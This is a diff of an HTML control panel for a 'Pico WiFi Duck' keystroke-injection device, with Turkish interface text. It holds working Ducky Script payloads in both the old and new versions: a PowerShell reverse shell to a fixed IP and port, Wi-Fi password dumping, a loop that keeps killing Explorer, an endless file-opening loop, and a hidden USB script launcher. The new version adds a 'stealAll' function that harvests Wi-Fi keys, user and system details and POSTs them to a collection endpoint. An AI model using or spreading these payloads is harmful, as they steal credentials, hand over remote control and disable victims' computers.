@@ -1,242 +1,94 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pico WIFI-Duck</title>
+    <title>Pico WiFi Duck</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #36393e;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-
-        .form {
-            background-color: #2f3136;
-            height: 400px;
-            width: 400px;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        textarea {
-            color: #bfbfbf;
-            resize: vertical;
-            width: 100%;
-            height: 400px;
-            padding: 15px;
-            border: none;
-            border-radius: 4px;
-            background: #36393e;
-            font-family: "Courier New", Courier, monospace;
-            box-sizing: border-box;
-            -moz-box-sizing: border-box;
-            -webkit-box-sizing: border-box;
-        }
-
-        button {
-            background-color: #ffc107;
-            color: white;
-            padding: 14px 20px;
-            margin: 8px 0;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-
-        button:hover {
-            background-color: #9f7e1c;
-        }
-
-        h1 {
-            font-size: 1.4rem;
-            margin-top: 1rem;
-            background: #bfbfbf;
-            padding: 10px;
-            border-radius: 4px;
-            border-left: solid #20c20e 5px;
-            font-weight: 100;
-            letter-spacing: 5px;
-        }
-
-        footer {
-            background-color: #2f3136;
-            color: white;
-            text-align: center;
-            padding: 10px;
-            position: fixed;
-            bottom: 0;
-            width: 100%;
-        }
-
-        .title {
-            font-size: 1.5rem;
-            margin-bottom: 1rem;
-            color: black;
-            position: absolute;
-            top: 60px;
-            left: 50%;
-            transform: translateX(-50%);
-        }
-
-        .script-buttons {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 10px;
-        }
-
-        .script-buttons button {
-            background-color: #4CAF50;
-            color: white;
-            padding: 10px 15px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 14px;
-        }
-
-        .script-buttons button:hover {
-            background-color: #45a049;
-        }
+        body{font-family:Arial;background:#36393e;margin:0;padding:20px;color:#fff}
+        .container{display:flex;gap:20px;max-width:900px;margin:0 auto}
+        .panel{background:#2f3136;padding:20px;border-radius:8px;flex:1}
+        h2{color:#fff;font-size:1.2rem;margin:0 0 15px 0}
+        textarea{width:100%;height:250px;padding:10px;background:#1a1a1a;color:#0f0;border:none;border-radius:4px;font-family:monospace;box-sizing:border-box;resize:vertical}
+        button{background:#ffc107;color:#000;padding:12px;margin:5px 0;border:none;border-radius:4px;cursor:pointer;font-size:14px;width:100%;font-weight:bold}
+        button:hover{opacity:0.9}
+        .blue{background:#2196F3;color:#fff}
+        .green{background:#4CAF50;color:#fff}
+        .red{background:#f44336;color:#fff}
+        .purple{background:#9c27b0;color:#fff}
+        .status{background:#1a1a1a;padding:10px;border-radius:4px;margin:10px 0;font-size:12px}
+        .btn-group{display:flex;gap:5px;flex-wrap:wrap}
+        .btn-group button{flex:1;min-width:70px;font-size:12px;padding:8px}
     </style>
 </head>
 <body>
-    <script>
-        function sendHttpRequest(data) {
-            console.log(data);
-            var url = "http://192.168.4.1/api";
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", url, true);
-            xhr.setRequestHeader("Content-Type", "application/json");
-
-            xhr.onreadystatechange = function () {
-                if (xhr.readyState === XMLHttpRequest.DONE) {
-                    if (xhr.status === 200) {
-                        console.log("Request sent successfully!");
-                    } else {
-                        console.error("Request failed. Status:", xhr.status);
-                    }
-                }
-            };
-
-            xhr.send(JSON.stringify(data));
-        }
-
-        function main() {
-            var payload = document.getElementById("payload").value;
-            var data = { username: "Payload", content: payload };
-            sendHttpRequest(data);
-        }
-
-        function loadTheFBombScript() {
-            const theFBombScript = `
-REM Title: the_f_bomb
-REM Author: @tjgeirk
-REM Description: The littlest payload known to duck-kind
-REM it's f_ing hilarious - works on all windows machines with powershell
-DELAY 300
-GUI r
-DELAY 100
-STRING powershell while(1){ii **}
-ENTER
-`;
-            document.getElementById("payload").value = theFBombScript;
-        }
-
-        function loadExplorerCrashScript() {
-            const explorerCrashScript = `
-REM Kill-Explorer v1.0
-REM Target: Windows 10, 11
-REM Author: Nate
-REM This script continuously kills Windows Explorer, disabling desktop functionality.
-
-DELAY 500
-GUI r
-DELAY 500
-STRING powershell -NoP -NonI -W Hidden -Command "while($true){Stop-Process -Name explorer -Force}"
-ENTER
-`;
-            document.getElementById("payload").value = explorerCrashScript;
-        }
-
-        function loadWifiStealScript() {
-            const wifiStealScript = `
-DELAY 1000
-GUI r
-DELAY 1000
-STRING cmd
-DELAY 1000
-ENTER
-DELAY 100
-STRING cd %userprofile%\\Desktop
-ENTER
-DELAY 500
-STRING for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear >> wifi.txt
-DELAY 1800
-ENTER
-DELAY 15000
-STRING exit
-`;
-            document.getElementById("payload").value = wifiStealScript;
-        }
-
-        function loadReverseShellScript() {
-            const reverseShellScript = `
-REM Reverse Shell Script (Antivirüs Atlatma)
-DELAY 1000
-GUI r
-DELAY 500
-STRING $ip='192.168.1.4'; $port=4444; $c=New-Object System.Net.Sockets.TCPClient($ip,$port); $s=$c.GetStream(); [byte[]]$b=0..65535|%{0}; while($true){$i=$s.Read($b,0,$b.Length); if($i -eq 0){break}; $d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i); $o=(Invoke-Expression $d 2>&1 | Out-String); $o2=$o+'PS '+(pwd).Path+'> '; $sb=([text.encoding]::ASCII).GetBytes($o2); $s.Write($sb,0,$sb.Length); $s.Flush()}; $c.Close()
-ENTER
-`;
-            document.getElementById("payload").value = reverseShellScript;
-        }
-		function loadUsbsteal() {
-    const Usbsteal = `
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell
-ENTER
-DELAY 1000
-STRING $d=Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE DriveType=2 AND Label='Kali Linax'"
-ENTER
-DELAY 500
-STRING if ($d) { $p=$d.DriveLetter+'\\script.ps1'; if (Test-Path $p) { powershell -W Hidden -NoP -Exec Bypass -File "$p" } else { Write-Host 'Script not found' } } else { Write-Host 'USB not found' }
-ENTER
-STRING exit
-ENTER
-`;
-    document.getElementById("payload").value = Usbsteal;
-}
-
-
-    </script>
-    <div class="title"><h1>Pico WiFi Duck</h1></div>
-    <div class="form">
-        <h1>Editor <a class="reload" id="editorReload"></a></h1>
-        <div class="script-buttons">
-            <button onclick="loadTheFBombScript()">the_f_bomb</button>
-            <button onclick="loadExplorerCrashScript()">explorercrash</button>
-            <button onclick="loadWifiStealScript()">wifisteal</button>
-            <button onclick="loadReverseShellScript()">Reverse Shell</button> <!-- Yeni buton -->
-			<button onclick="loadUsbsteal()">Usbsteal</button>
-		</div>
-        <textarea id="payload" name="content" placeholder="Enter text here..."></textarea>
-        <button onclick="main()">RUN</button>
+    <div class="container">
+        <div class="panel">
+            <h2>🦆 Ducky Script</h2>
+            <div class="btn-group">
+                <button onclick="loadScript('f-bomb')">💣</button>
+                <button onclick="loadScript('explorer')">💥</button>
+                <button onclick="loadScript('wifi')">🔑</button>
+                <button onclick="loadScript('reverse')">🐚</button>
+            </div>
+            <textarea id="payload" placeholder="Script yazın..."></textarea>
+            <button onclick="runPayload()">▶ RUN</button>
+        </div>
+        
+        <div class="panel">
+            <h2>🎮 Jiggler</h2>
+            <button class="blue" onclick="send('/jiggle/mouse')">🖱️ Mouse</button>
+            <button class="blue" onclick="send('/jiggle/combined')">🖱️⌨️ Mouse+Klavye</button>
+            <button class="red" onclick="send('/jiggle/stop')">⏹️ DURDUR</button>
+            
+            <h2 style="margin-top:20px">📊 Bilgi Topla</h2>
+            <button class="purple" onclick="stealAll()">🔍 Tüm Bilgileri Topla</button>
+            <button class="green" onclick="location.href='/view'">👁️ Görüntüle</button>
+            
+            <div class="status" id="status">
+                ⚡ Hazır<br>
+                <small>GP5→GND:Mouse | GP6→GND:Mouse+Klavye</small>
+            </div>
+        </div>
     </div>
-    <footer style="background-color: #2f3136; color: white; text-align: center; padding: 10px;">
-        &copy; <span id="currentYear"></span> Majd Sassi | <a href="https://github.com/majdsassi/pico-wifi-duck">Github</a>
-    </footer>
+
+    <script>
+        async function send(url, data=null) {
+            try {
+                let r = await fetch(url, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: data ? JSON.stringify(data) : null
+                });
+                document.getElementById('status').innerHTML = r.ok ? '✅ Başarılı' : '❌ Hata';
+            } catch(e) {
+                document.getElementById('status').innerHTML = '❌ Bağlantı hatası';
+            }
+        }
+        
+        function runPayload() {
+            let payload = document.getElementById('payload').value;
+            send('/api', {content: payload});
+        }
+        
+       function stealAll() {
+    let cmd = "$w=@();netsh wlan show profiles|sls ':'|%{$w+=$_.ToString().Split(':')[1].Trim()};$s=@{type='all';wifi=@();pc=$env:COMPUTERNAME;user=$env:USERNAME;os=(gwmi win32_operatingsystem).caption;tarih=(Get-Date -Format 'dd.MM.yyyy HH:mm:ss')};foreach($n in $w){$p=netsh wlan show profile name=$n key=clear|sls 'Key Content';if($p){$pw=$p.ToString().Replace('Key Content            : ','')}else{$pw='(Acik)'};$s.wifi+=@{ssid=$n;pwd=$pw}};$s.cpu=(gwmi win32_processor).Name;$s.ram=[math]::Round((gwmi win32_computersystem).TotalPhysicalMemory/1GB);$s.gpu=(gwmi win32_videocontroller).Name;$ip=gwmi Win32_NetworkAdapterConfiguration|?{$_.IPAddress -ne $null -and $_.DefaultIPGateway -ne $null};$s.ip=$ip.IPAddress[0];$s.mac=$ip.MACAddress;$s.uptime=(gwmi win32_operatingsystem).LastBootUpTime;$j=$s|ConvertTo-Json -Compress;irm 192.168.4.1/collect -Method POST -Body $j";
+    
+    let script = "DELAY 500\nGUI r\nDELAY 500\nSTRING powershell\nENTER\nDELAY 1000\nSTRING " + cmd + "\nENTER\nDELAY 3000\nSTRING exit\nENTER";
+    
+    document.getElementById('payload').value = script;
+    send('/api', {content: script});
+}
+        
+        function loadScript(t) {
+            let s = {
+                'f-bomb': 'DELAY 300\nGUI r\nDELAY 100\nSTRING powershell while(1){ii **}\nENTER',
+                'explorer': 'DELAY 500\nGUI r\nDELAY 500\nSTRING powershell while($true){Stop-Process -Name explorer -Force}\nENTER',
+                'wifi': 'DELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nSTRING cd %userprofile%\\Desktop & netsh wlan export profile key=clear\nENTER',
+                'reverse': 'DELAY 500\nGUI r\nDELAY 500\nSTRING powershell -c "$c=New-Object Net.Sockets.TCPClient(\'192.168.1.4\',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($o);$s.Write($sb,0,$sb.Length)}"\nENTER'
+            };
+            document.getElementById('payload').value = s[t] || '';
+        }
+    </script>
 </body>
 </html>
